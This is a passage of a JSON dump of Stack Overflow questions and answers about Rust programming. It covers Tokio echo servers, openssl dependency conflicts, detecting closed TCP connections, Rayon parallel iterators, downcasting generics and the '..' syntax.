std::sync::mpsc::channel();\n        let cancel = Cancellable {\n            rx: rx,\n        };\n        let action = reader\n        .map(move |line|{\n            println!(\"ECHO: {}\",line);\n            if line == \"bye\"{\n                println!(\"BYE\");\n                tx.send(()).unwrap();\n            }\n            line\n        })\n        .forward(writer)\n        .select2(cancel)\n        .map(|_|{\n\n        })\n        .map_err(|err|{\n            println!(\"error\");\n        });\n        tokio::executor::current_thread::spawn(action);\n\n        Ok(())\n    }).map_err(|err|{\n        println!(\"error = {:?}\",err);\n    });\n    tokio::executor::current_thread::run(|_|{\n        tokio::executor::current_thread::spawn(server);\n    });\n}\n</code></pre>\n"}], "owner": {"reputation": 604, "user_id": 3884974, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/a1f5eca7d4c975bd4ad5886c04a942fc?s=128&d=identicon&r=PG", "display_name": "Adri&#225;n Arroyo Calle", "link": "https://stackoverflow.com/users/3884974/adri%c3%a1n-arroyo-calle"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1044, "favorite_count": 0, "accepted_answer_id": 49019099, "answer_count": 1, "score": -1, "last_activity_date": 1519771036, "creation_date": 1519303421, "last_edit_date": 1519498192, "question_id": 48927743, "link": "https://stackoverflow.com/questions/48927743/tokio-echo-server-cannot-read-and-write-in-the-same-future", "title": "Tokio echo server. Cannot read and write in the same future", "body": "<p>I'm trying to build an echo server in Tokio. I've seen examples, but all of them seem to use <code>io::copy</code> from Tokio IO which I can't use because I want to modify the output.</p>\n\n<p>However, I can't compile a server that uses <code>writer</code> and <code>reader</code> at the same time. I want to build a task based on futures that enables reading/writing in a loop (an echo server).</p>\n\n<p>My actual code is this:</p>\n\n<pre><code>extern crate futures;\nextern crate futures_cpupool;\nextern crate tokio;\nextern crate tokio_io;\n\nuse futures::prelude::*;\nuse futures_cpupool::CpuPool;\nuse tokio_io::AsyncRead;\nuse futures::Stream;\nuse futures::stream;\nuse tokio_io::codec::*;\nuse std::rc::Rc;\n\nfn main() {\n    let pool = CpuPool::new_num_cpus();\n    use std::net::*;\n    let socket = SocketAddr::new(IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1)), 8080);\n    let listener = tokio::net::TcpListener::bind(&amp;socket).unwrap();\n    let server = listener.incoming().for_each(|socket| {\n        let (writer, reader) = socket.framed(LinesCodec::new()).split();\n        let writer = Rc::new(writer);\n        let action = reader.for_each(|line| {\n            println!(\"ECHO: {}\", line);\n            writer.send(line);\n            Ok(())\n        });\n        pool.spawn(action); // std::rc::Rc&lt;futures::stream::SplitSink&lt;tokio_io::codec::Framed&lt;tokio::net::TcpStream, tokio_io::codec::LinesCodec&gt;&gt;&gt;` cannot be shared between threads safely\n        Ok(())\n    });\n    server.wait().unwrap();\n}\n</code></pre>\n\n<p>You might say that I must use <code>Arc</code> because there are different threads involved. I've tried with <code>Arc</code> and <code>Mutex</code>, but another error arises and I can't figure a way to make it compile:</p>\n\n<pre><code>extern crate futures;\nextern crate futures_cpupool;\nextern crate tokio;\nextern crate tokio_io;\n\nuse futures::prelude::*;\nuse std::time;\nuse std::thread;\nuse futures_cpupool::CpuPool;\nuse tokio_io::AsyncRead;\nuse futures::Stream;\nuse tokio_io::codec::*;\nuse std::sync::Arc;\nuse std::sync::Mutex;\n\nfn main() {\n    let pool = CpuPool::new_num_cpus();\n    use std::net::*;\n    let socket = SocketAddr::new(IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1)), 8080);\n    let listener = tokio::net::TcpListener::bind(&amp;socket).unwrap();\n    let server = listener.incoming().for_each(|socket| {\n        let (writer, reader) = socket.framed(LinesCodec::new()).split();\n        let writer = Arc::new(Mutex::new(writer));\n        let action = reader.for_each(move |line| {\n            println!(\"ECHO: {}\", line);\n            writer.lock().unwrap().send(line); // cannot move out of borrowed content\n            Ok(())\n        });\n        pool.spawn(action);\n        Ok(())\n    });\n    server.wait().unwrap();\n}\n</code></pre>\n\n<p>The error it says is: <code>cannot move out of borrowed content</code></p>\n"}, {"tags": ["openssl", "cryptography", "rust", "rust-cargo"], "comments": [{"owner": {"reputation": 44438, "user_id": 42353, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f05e802879a805c03a55645dfcc0d4ea?s=128&d=identicon&r=PG", "display_name": "DK.", "link": "https://stackoverflow.com/users/42353/dk"}, "edited": false, "score": 3, "creation_date": 1519300302, "post_id": 48925605, "comment_id": 84859462, "body": "That error message is not about <code>openssl</code>, it&#39;s referring to <code>openssl-sys</code>.  Depending on <code>openssl</code> directly works just fine for me, which suggests that you&#39;re depending on <i>more</i> than just <code>openssl</code>, or you&#39;ve got some other constraint somewhere you haven&#39;t mentioned."}, {"owner": {"reputation": 1470, "user_id": 2075745, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/6f9a084d236381e1882c4e28edb5151f?s=128&d=identicon&r=PG", "display_name": "user25064", "link": "https://stackoverflow.com/users/2075745/user25064"}, "edited": false, "score": 0, "creation_date": 1519310837, "post_id": 48925605, "comment_id": 84867100, "body": "<code>possible versions to select: 0.9.26</code> refers to the version of <code>openssl-sys</code> that is referenced by openssl. Try using openssl version 0.9.23 it seems to reference <code>openssl-sys</code> version 0.9.24 that is suggested see <a href=\"https://github.com/sfackler/rust-openssl/blob/9a27bb2c032b666fc7dc607a804f8dc144959034/openssl/Cargo.toml\" rel=\"nofollow noreferrer\">here</a>"}], "owner": {"reputation": 497, "user_id": 9383887, "user_type": "registered", "accept_rate": 14, "profile_image": "https://www.gravatar.com/avatar/bd4404f5ac586a9c03e32eb62e55891a?s=128&d=identicon&r=PG&f=1", "display_name": "jerry", "link": "https://stackoverflow.com/users/9383887/jerry"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 97, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1519296839, "creation_date": 1519296839, "question_id": 48925605, "link": "https://stackoverflow.com/questions/48925605/no-version-of-openssl-is-available-because-of-a-conflict", "title": "No version of openssl is available because of a conflict", "body": "<p>I'm trying to use openssl:</p>\n\n<pre><code># Cargo.toml\nopenssl = \"0.10.4\"\n</code></pre>\n\n<p>Error:</p>\n\n<pre><code>error: failed to select a version for `openssl-sys` (required by `openssl`):\nall possible versions conflict with previously selected versions of `openssl-sys`\nversion 0.9.24 in use by openssl-sys v0.9.24\npossible versions to select: 0.9.26\n</code></pre>\n\n<p>Ok, I'm trying 0.9.26</p>\n\n<pre><code># Cargo.toml\nopenssl = \"0.9.26\"\n</code></pre>\n\n<p>And:</p>\n\n<pre><code>error: no matching version `^0.9.26` found for package `openssl` (required by `test1_app`)\nlocation searched: registry `https://github.com/rust-lang/crates.io-index`\nversions found: 0.10.4, 0.10.3, 0.10.2, ...\n</code></pre>\n"}, {"tags": ["multithreading", "sockets", "networking", "rust", "tcplistener"], "comments": [{"owner": {"reputation": 870071, "user_id": 17034, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Cii6b.png?s=128&g=1", "display_name": "Hans Passant", "link": "https://stackoverflow.com/users/17034/hans-passant"}, "edited": false, "score": 4, "creation_date": 1519303636, "post_id": 48924961, "comment_id": 84861688, "body": "When you get a 0 return from read_line() then you know that the client decided to quit."}, {"owner": {"reputation": 705, "user_id": 3292304, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2ce151acbd28ae71c472b961004b0a9f?s=128&d=identicon&r=PG", "display_name": "Razakhel", "link": "https://stackoverflow.com/users/3292304/razakhel"}, "reply_to_user": {"reputation": 870071, "user_id": 17034, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Cii6b.png?s=128&g=1", "display_name": "Hans Passant", "link": "https://stackoverflow.com/users/17034/hans-passant"}, "edited": false, "score": 0, "creation_date": 1519375337, "post_id": 48924961, "comment_id": 84894667, "body": "The doc is not really precise on this point (given their description that may be wrong to fully rely on this), but since it works now I&#39;ll go with that. Thanks!"}], "answers": [{"tags": [], "owner": {"reputation": 566, "user_id": 1480374, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/5534b0e86f957dafe87c9b244a0face4?s=128&d=identicon&r=PG", "display_name": "fyaa", "link": "https://stackoverflow.com/users/1480374/fyaa"}, "is_accepted": true, "score": 0, "last_activity_date": 1519895260, "creation_date": 1519895260, "answer_id": 49046175, "question_id": 48924961, "link": "https://stackoverflow.com/questions/48924961/is-there-a-way-to-check-if-a-connection-has-been-closed-then-finish-the-thread/49046175#49046175", "title": "Is there a way to check if a connection has been closed then finish the thread?", "body": "<p>From the docs of <code>read_line</code>:</p>\n\n<blockquote>\n  <p>An empty buffer returned indicates that the stream has reached EOF.</p>\n</blockquote>\n\n<p>So you could do it like this:</p>\n\n<pre><code>fn handle_client(stream: TcpStream) {\n    let mut stream = BufReader::new(stream);\n    println!(\"New client logged\");\n\n    loop {\n        let mut recv_buffer = String::new();\n        println!(\"Before reading\");\n        let recv_data_size = stream\n            .read_line(&amp;mut recv_buffer)\n            .expect(\"Error when reading line\");\n\n        if recv_data_size &gt; 0 {\n            println!(\"{}\", recv_buffer);\n        } else {\n            // stream has reached EOF\n            break;\n        }\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 705, "user_id": 3292304, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2ce151acbd28ae71c472b961004b0a9f?s=128&d=identicon&r=PG", "display_name": "Razakhel", "link": "https://stackoverflow.com/users/3292304/razakhel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1511, "favorite_count": 0, "accepted_answer_id": 49046175, "answer_count": 1, "score": 1, "last_activity_date": 1519895260, "creation_date": 1519294985, "last_edit_date": 1519495411, "question_id": 48924961, "link": "https://stackoverflow.com/questions/48924961/is-there-a-way-to-check-if-a-connection-has-been-closed-then-finish-the-thread", "title": "Is there a way to check if a connection has been closed then finish the thread?", "body": "<p>With a code similar to that of <a href=\"https://rosettacode.org/wiki/Echo_server#Rust\" rel=\"nofollow noreferrer\">this example</a>, a connection goes on forever because the infinite loop never stops. I modified it a bit in order to allow reading not to be blocking the thread:</p>\n\n<pre><code>use std::net::{TcpListener, TcpStream};\nuse std::io::{BufRead, BufReader};\nuse std::thread;\n\nfn main() {\n    let listener = TcpListener::bind(\"127.0.0.1:4444\").unwrap();\n    println!(\"Server is running on 127.0.0.1:4444 ...\");\n\n    for stream in listener.incoming() {\n        let stream = stream.unwrap();\n        stream\n            .set_nonblocking(true)\n            .expect(\"Failed to set stream as nonblocking\");\n        thread::spawn(move || handle_client(stream));\n    }\n}\n\nfn handle_client(stream: TcpStream) {\n    let mut stream = BufReader::new(stream);\n    println!(\"New client logged\");\n\n    loop {\n        let mut recv_buffer = String::new();\n        println!(\"Before reading\");\n        let recv_data_size = stream\n            .read_line(&amp;mut recv_buffer)\n            .expect(\"Error when reading line\");\n\n        if recv_data_size &gt; 0 {\n            println!(\"{}\", recv_buffer);\n        }\n    }\n}\n</code></pre>\n\n<p>The client is really simple, connects then send <code>Hello!</code> to the server:</p>\n\n<pre><code>use std::io::prelude::*;\nuse std::net::TcpStream;\n\nfn main() {\n    let mut stream = TcpStream::connect(\"127.0.0.1:4444\").unwrap();\n    let _ = stream.write(\"Hello!\".as_bytes());\n}\n</code></pre>\n\n<p>When client sends its string and <em>disconnects</em>, the server goes into an infinite loop and prints <code>Before reading</code> indefinitely. It never knows when to close connection, even though the client ended it long ago.</p>\n\n<p>Is there a way in Rust to check if distant connection has been closed (if possible without having to set a timeout), then finish properly the thread on which it is running?</p>\n"}, {"tags": ["rust", "rayon"], "comments": [{"owner": {"reputation": 25137, "user_id": 4498831, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/jDBV2.png?s=128&g=1", "display_name": "Boiethios", "link": "https://stackoverflow.com/users/4498831/boiethios"}, "edited": false, "score": 1, "creation_date": 1519288887, "post_id": 48922420, "comment_id": 84852100, "body": "<code>par_iter</code> as stated in the doc?"}, {"owner": {"reputation": 1583, "user_id": 964375, "user_type": "registered", "accept_rate": 39, "profile_image": "https://www.gravatar.com/avatar/38430929bc031983e074dafea21b3d88?s=128&d=identicon&r=PG", "display_name": "user964375", "link": "https://stackoverflow.com/users/964375/user964375"}, "reply_to_user": {"reputation": 25137, "user_id": 4498831, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/jDBV2.png?s=128&g=1", "display_name": "Boiethios", "link": "https://stackoverflow.com/users/4498831/boiethios"}, "edited": false, "score": 1, "creation_date": 1519289114, "post_id": 48922420, "comment_id": 84852237, "body": "I tried that but got the following error:  error[E0599]: no method named <code>par_iter</code> found for type <code>regex::CaptureMatches&lt;&#39;_, &#39;_&gt;</code> in the current scope   --&gt; src/main.rs:24:58    | 24 |  let urls: HashSet&lt;String&gt; = re.captures_iter(&amp;contents).par_iter()    |                                                          ^^^^^^^^    |    = note: the method <code>par_iter</code> exists but the following trait bounds were not satisfied:            <code>regex::CaptureMatches&lt;&#39;_, &#39;_&gt; : rayon::iter::IntoParallelRefIterator</code>"}], "answers": [{"tags": [], "owner": {"reputation": 25137, "user_id": 4498831, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/jDBV2.png?s=128&g=1", "display_name": "Boiethios", "link": "https://stackoverflow.com/users/4498831/boiethios"}, "is_accepted": false, "score": 8, "last_activity_date": 1557906144, "last_edit_date": 1557906144, "creation_date": 1519302268, "answer_id": 48927364, "question_id": 48922420, "link": "https://stackoverflow.com/questions/48922420/how-do-i-use-rayon-with-an-existing-iterator/48927364#48927364", "title": "How do I use Rayon with an existing iterator?", "body": "<p>This answer is outdated for the last version of rayon. See the <a href=\"https://stackoverflow.com/a/54201274/4498831\">other answer</a> for a possible solution. It may or may not apply to your usecase.</p>\n\n<hr>\n\n<p>Minimal reproduction:</p>\n\n<pre><code>extern crate rayon;\n\nuse rayon::prelude::*;\n\nfn main() {\n    let v = vec![1_i32, 2, 3, 4].into_iter();\n\n    // no method named `par_iter` found for type `std::vec::IntoIter&lt;i32&gt;`\n    let _ = v.par_iter().sum();\n}\n</code></pre>\n\n<p>You cannot do that. <a href=\"https://docs.rs/rayon/1.0.0/rayon/iter/trait.IntoParallelIterator.html#foreign-impls\" rel=\"nofollow noreferrer\">Here</a> are all the implementors of this feature, that are:</p>\n\n<ul>\n<li>BinaryHeap</li>\n<li>BTreeMap</li>\n<li>BTreeSet</li>\n<li>HashMap</li>\n<li>HashSet</li>\n<li>LinkedList</li>\n<li>VecDeque</li>\n<li>Option</li>\n<li>Range</li>\n<li>Result</li>\n<li>Slice/Array</li>\n</ul>\n\n<p>I think that the reason why you cannot parallelize them is because iterators are lazy. An iterator is basically a current item <code>Option&lt;Item&gt;</code> and a <code>next()</code> method. You cannot split it in two parts to execute them in different threads.</p>\n"}, {"comments": [{"owner": {"reputation": 102109, "user_id": 1600898, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/01377f8b31f24b0265854666b29d0c03?s=128&d=identicon&r=PG", "display_name": "user4815162342", "link": "https://stackoverflow.com/users/1600898/user4815162342"}, "edited": false, "score": 0, "creation_date": 1595755740, "post_id": 54201274, "comment_id": 111578642, "body": "Note that you can use <code>rayon::prelude::*</code> to get traits such as <code>ParallelBridge</code> and <code>ParallelIterator</code> automatically. (It might be a matter of taste, though, but I find that naming the <i>traits</i> manually doesn&#39;t improve readability of the module.) Also, rayon has <a href=\"https://docs.rs/rayon/1.3.1/rayon/slice/trait.ParallelSliceMut.html#method.par_sort_unstable\" rel=\"nofollow noreferrer\">its own sort</a> which you might want to use to sort the output by multiple cores."}], "tags": [], "owner": {"reputation": 497, "user_id": 789636, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/2764460fe747a1b6ca462fc71768ea50?s=128&d=identicon&r=PG", "display_name": "Jesse Grosjean", "link": "https://stackoverflow.com/users/789636/jesse-grosjean"}, "is_accepted": false, "score": 10, "last_activity_date": 1547564867, "last_edit_date": 1547564867, "creation_date": 1547563804, "answer_id": 54201274, "question_id": 48922420, "link": "https://stackoverflow.com/questions/48922420/how-do-i-use-rayon-with-an-existing-iterator/54201274#54201274", "title": "How do I use Rayon with an existing iterator?", "body": "<p>This is possible now with <a href=\"https://docs.rs/rayon/1.0.3/rayon/iter/trait.ParallelBridge.html\" rel=\"noreferrer\"><code>ParallelBridge</code></a>:</p>\n\n<pre class=\"lang-rust prettyprint-override\"><code>use rayon::iter::ParallelBridge;\nuse rayon::prelude::ParallelIterator;\nuse std::sync::mpsc::channel;\n\nlet rx = {\n    let (tx, rx) = channel();\n\n    tx.send(\"one!\");\n    tx.send(\"two!\");\n    tx.send(\"three!\");\n\n    rx\n};\n\nlet mut output: Vec&lt;&amp;'static str&gt; = rx.into_iter().par_bridge().collect();\noutput.sort_unstable();\n\nassert_eq!(&amp;*output, &amp;[\"one!\", \"three!\", \"two!\"]);\n</code></pre>\n"}], "owner": {"reputation": 1583, "user_id": 964375, "user_type": "registered", "accept_rate": 39, "profile_image": "https://www.gravatar.com/avatar/38430929bc031983e074dafea21b3d88?s=128&d=identicon&r=PG", "display_name": "user964375", "link": "https://stackoverflow.com/users/964375/user964375"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2658, "favorite_count": 0, "answer_count": 2, "score": 7, "last_activity_date": 1557906144, "creation_date": 1519287022, "last_edit_date": 1547564831, "question_id": 48922420, "link": "https://stackoverflow.com/questions/48922420/how-do-i-use-rayon-with-an-existing-iterator", "title": "How do I use Rayon with an existing iterator?", "body": "<p>I turn a regex into a <code>HashSet</code> after doing some filtering. I am trying to use it with Rayon, but I can't figure out how to make Rayon work with an existing iterator without converting it to a vector first. Is this possible?</p>\n\n<pre><code>let re = Regex::new(\"url=\\\"(?P&lt;url&gt;.+?)\\\"\").unwrap();\nlet urls: HashSet&lt;String&gt; = re.captures_iter(&amp;contents)\n    .map(|m| Url::parse(m.name(\"url\").unwrap().as_str()))\n    .filter(|parsed_url| parsed_url.is_ok())\n    .map(|parsed_url| parsed_url.unwrap())\n    .filter(|parsed_url| parsed_url.has_host())\n    .map(|parsed_url| parsed_url.into_string())\n    .collect();\n</code></pre>\n"}, {"tags": ["rust"], "answers": [{"tags": [], "owner": {"reputation": 44438, "user_id": 42353, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f05e802879a805c03a55645dfcc0d4ea?s=128&d=identicon&r=PG", "display_name": "DK.", "link": "https://stackoverflow.com/users/42353/dk"}, "is_accepted": true, "score": 3, "last_activity_date": 1519495229, "last_edit_date": 1519495229, "creation_date": 1519288587, "answer_id": 48922841, "question_id": 48921861, "link": "https://stackoverflow.com/questions/48921861/how-do-you-convert-an-instance-of-generic-t-into-a-concrete-instance-in-rust/48922841#48922841", "title": "How do you convert an instance of generic T into a concrete instance in Rust?", "body": "<p>You need to go via <code>Box</code>, like so:</p>\n\n<pre><code>fn execute&lt;T&gt;(command: T)\nwhere\n    T: Any + Debug,\n{\n    println!(\"Command: {:?}\", command);\n    let any: Box&lt;Any&gt; = Box::new(command);\n\n    let any = match any.downcast() {\n        Ok(c) =&gt; return (FooCommandHandler {}).execute(*c),\n        Err(any) =&gt; any,\n    };\n\n    let any = match any.downcast() {\n        Ok(c) =&gt; return (BarCommandHandler {}).execute(*c),\n        Err(any) =&gt; any,\n    };\n\n    let _ = any; // avoid unused variable error\n    panic!(\"could not downcast command\");\n}\n</code></pre>\n\n<hr>\n\n<p>\"But I don't <em>wanna</em> use a <code>Box</code>!\"</p>\n\n<p>Just use <code>Box</code>.</p>\n\n<p>\"But it's an allocation!  I've measured the above code and proven beyond a shadow of a doubt that it's a bottleneck!\"</p>\n\n<p>What?  <em>Really?</em></p>\n\n<p>\"You can't prove otherwise.\"</p>\n\n<p><em>Oh fine</em>.  But I <em>do not</em> guarantee that this will work in all cases.  This is treading into \"blow yourself up\" territory.  Do not do this unless you <em>know</em> you need to:</p>\n\n<pre><code>fn execute&lt;T&gt;(command: T)\nwhere\n    T: Any + Debug,\n{\n    use std::any::TypeId;\n    use std::mem;\n\n    println!(\"Command: {:?}\", command);\n\n    macro_rules! do_cast {\n            ($t:ty, $h:expr) =&gt; {\n                if TypeId::of::&lt;T&gt;() == TypeId::of::&lt;$t&gt;() {\n                    let casted: $t = mem::transmute_copy(&amp;command);\n                    mem::forget(command); // we CANNOT let command drop.\n                    $h.execute(casted);\n                    return;\n                }\n            };\n        }\n\n    unsafe {\n        do_cast!(FooCommand, FooCommandHandler {});\n        do_cast!(BarCommand, BarCommandHandler {});\n    }\n\n    panic!(\"could not downcast command\");\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 25893, "user_id": 353820, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/32b29e1dc23c2c5abe0283ab7b9541d3?s=128&d=identicon&r=PG", "display_name": "Doug", "link": "https://stackoverflow.com/users/353820/doug"}, "is_accepted": false, "score": 0, "last_activity_date": 1519495262, "last_edit_date": 1519495262, "creation_date": 1519301884, "answer_id": 48927244, "question_id": 48921861, "link": "https://stackoverflow.com/questions/48921861/how-do-you-convert-an-instance-of-generic-t-into-a-concrete-instance-in-rust/48927244#48927244", "title": "How do you convert an instance of generic T into a concrete instance in Rust?", "body": "<p>Just as a quick summary of the accepted answer:</p>\n\n<p>Where <code>&amp;Any</code> only has:</p>\n\n<pre><code>pub fn downcast_ref&lt;T&gt;(&amp;self) -&gt; Option&lt;&amp;T&gt; where T: Any\n</code></pre>\n\n<p><code>Box&lt;Any&gt;</code> implements:</p>\n\n<pre><code>pub fn downcast&lt;T&gt;(self) -&gt; Result&lt;Box&lt;T&gt;, Box&lt;Any + 'static&gt;&gt; where T: Any\n</code></pre>\n\n<p>However, for complicated reasons, the documentation is on <a href=\"https://doc.rust-lang.org/beta/std/boxed/struct.Box.html#method.downcast\" rel=\"nofollow noreferrer\"><code>Box</code></a> not on <a href=\"https://doc.rust-lang.org/beta/std/any/trait.Any.html#method.downcast_mut\" rel=\"nofollow noreferrer\"><code>Any</code></a>.</p>\n"}], "owner": {"reputation": 25893, "user_id": 353820, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/32b29e1dc23c2c5abe0283ab7b9541d3?s=128&d=identicon&r=PG", "display_name": "Doug", "link": "https://stackoverflow.com/users/353820/doug"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 63, "favorite_count": 0, "accepted_answer_id": 48922841, "answer_count": 2, "score": 3, "last_activity_date": 1519495262, "creation_date": 1519284842, "last_edit_date": 1519495160, "question_id": 48921861, "link": "https://stackoverflow.com/questions/48921861/how-do-you-convert-an-instance-of-generic-t-into-a-concrete-instance-in-rust", "title": "How do you convert an instance of generic T into a concrete instance in Rust?", "body": "<p>I'm trying to implement this pattern:</p>\n\n<pre><code>use std::any::Any;\nuse std::fmt::Debug;\n\ntrait CommandHandler&lt;TCommand&gt; {\n    fn execute(&amp;self, data: TCommand);\n}\n\n#[derive(Debug)]\nstruct FooCommand {}\n\nstruct FooCommandHandler {}\n\nimpl CommandHandler&lt;FooCommand&gt; for FooCommandHandler {\n    fn execute(&amp;self, data: FooCommand) {\n        println!(\"Foo\");\n    }\n}\n\n#[derive(Debug)]\nstruct BarCommand {}\n\nstruct BarCommandHandler {}\n\nimpl CommandHandler&lt;BarCommand&gt; for BarCommandHandler {\n    fn execute(&amp;self, data: BarCommand) {\n        println!(\"Bar\");\n    }\n}\n\nfn execute&lt;T&gt;(command: T)\nwhere\n    T: Any + Debug,\n{\n    println!(\"Command: {:?}\", command);\n    match (&amp;command as &amp;Any).downcast_ref::&lt;FooCommand&gt;() {\n        Some(c) =&gt; (FooCommandHandler {}).execute(c),\n        None =&gt; {}\n    };\n    match (&amp;command as &amp;Any).downcast_ref::&lt;BarCommand&gt;() {\n        Some(c) =&gt; (BarCommandHandler {}).execute(c),\n        None =&gt; {}\n    };\n}\n\nfn main() {\n    (FooCommandHandler {}).execute(FooCommand {});\n    (BarCommandHandler {}).execute(BarCommand {});\n    execute(FooCommand {});\n    execute(BarCommand {});\n}\n</code></pre>\n\n<p>This doesn't work:</p>\n\n<pre><code>error[E0308]: mismatched types\n  --&gt; src/main.rs:37:51\n   |\n37 |         Some(c) =&gt; (FooCommandHandler {}).execute(c),\n   |                                                   ^ expected struct `FooCommand`, found &amp;FooCommand\n   |\n   = note: expected type `FooCommand`\n              found type `&amp;FooCommand`\n\nerror[E0308]: mismatched types\n  --&gt; src/main.rs:41:51\n   |\n41 |         Some(c) =&gt; (BarCommandHandler {}).execute(c),\n   |                                                   ^ expected struct `BarCommand`, found &amp;BarCommand\n   |\n   = note: expected type `BarCommand`\n              found type `&amp;BarCommand`\n</code></pre>\n\n<p>How can I implement the <code>execute()</code> method in a way that preserves the following requirements:</p>\n\n<ul>\n<li>The type <code>XCommand</code> should be totally naive of the <code>XCommandHandler</code>'s that execute it.</li>\n<li>Multiple implementations of <code>CommandHandler&lt;X&gt;</code> may exist.</li>\n<li>The command handler receives (and consumes) the concrete command instance, not a reference to it (making duplicate dispatch of commands impossible).</li>\n</ul>\n\n<p>In essence, I have a generic function <code>fn foo&lt;T&gt;(v: T)</code> and a I wish to dispatch to a number of concrete functions <code>fn foo1(v: Foo)</code>, <code>fn foo2(v: Bar)</code>; how do I do that?</p>\n\n<p>Is <code>transmute</code> the only option?</p>\n\n<p>Note that this is distinct from what <code>Any::downcast_ref</code> does, which is return an <code>&amp;Foo</code>, not <code>Foo</code> from the generic value v.</p>\n"}, {"tags": ["rust"], "comments": [{"owner": {"reputation": 4594, "user_id": 1478356, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/996ee463b8f6b17a738f2e23f7ecfe9f?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/1478356/stefan"}, "edited": false, "score": 0, "creation_date": 1519282776, "post_id": 48918700, "comment_id": 84848981, "body": "The question in the title doesn&#39;t match the question at the bottom."}], "answers": [{"comments": [{"owner": {"reputation": 6992, "user_id": 495157, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/UFMPn.png?s=128&g=1", "display_name": "JGFMK", "link": "https://stackoverflow.com/users/495157/jgfmk"}, "edited": false, "score": 0, "creation_date": 1598730545, "post_id": 48921142, "comment_id": 112556553, "body": "<a href=\"https://doc.rust-lang.org/book/ch18-03-pattern-syntax.html#ignoring-remaining-parts-of-a-value-with-\" rel=\"nofollow noreferrer\">doc.rust-lang.org/book/&hellip;</a> - i believe this is the last one.."}], "tags": [], "owner": {"reputation": 25137, "user_id": 4498831, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/jDBV2.png?s=128&g=1", "display_name": "Boiethios", "link": "https://stackoverflow.com/users/4498831/boiethios"}, "is_accepted": true, "score": 4, "last_activity_date": 1556368129, "last_edit_date": 1556368129, "creation_date": 1519281695, "answer_id": 48921142, "question_id": 48918700, "link": "https://stackoverflow.com/questions/48918700/are-there-more-ways-to-use-dotdot-in-rust-aside-from-ranges/48921142#48921142", "title": "Are there more ways to use .. (dotdot) in Rust aside from ranges?", "body": "<p>No, there are not other usages, as you can see <a href=\"https://doc.rust-lang.org/book/appendix-02-operators.html\" rel=\"nofollow noreferrer\">in the reference</a>:</p>\n\n<ul>\n<li><code>(.., expr.., ..expr, expr..expr)</code>: right-exclusive range literal.</li>\n<li><code>(..expr)</code>: struct literal update syntax.</li>\n<li><code>(variant(x, ..), struct_type { x, .. })</code>: \u201cand the rest\u201d pattern binding.</li>\n</ul>\n"}], "owner": {"reputation": 179, "user_id": 770632, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/b1dc7fb13a51ca01f7c81450d2914001?s=128&d=identicon&r=PG", "display_name": "kamulos", "link": "https://stackoverflow.com/users/770632/kamulos"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 398, "favorite_count": 0, "accepted_answer_id": 48921142, "answer_count": 1, "score": 2, "last_activity_date": 1556368129, "creation_date": 1519266669, "last_edit_date": 1519495564, "question_id": 48918700, "link": "https://stackoverflow.com/questions/48918700/are-there-more-ways-to-use-dotdot-in-rust-aside-from-ranges", "title": "Are there more ways to use .. (dotdot) in Rust aside from ranges?", "body": "<p>I found out that <code>..</code> can be used in structs in this way:</p>\n\n<pre><code>struct Test {\n    e1: i32,\n    e2: i32,\n}\n\nfn main() {\n    let test = Test { e1: 1, e2: 2 };\n    let Test { e1: x, .. } = test;\n    let Test { e2: y, .. } = test;\n    let test2 = Test { ..test };\n    let test3 = Test { e1: 2, e2: 3, ..test };\n}\n</code></pre>\n\n<p>Are there more ways to use <code>..</code>? Is there an overview of them somewhere?</p>\n"}]